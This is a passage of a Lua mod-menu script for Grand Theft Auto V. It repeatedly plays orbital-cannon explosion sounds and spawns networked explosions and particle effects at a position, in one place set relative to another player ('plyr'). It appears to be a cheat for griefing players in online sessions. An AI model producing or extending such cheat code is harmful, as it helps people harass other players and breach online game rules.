					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)

				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
                local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 56.0)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
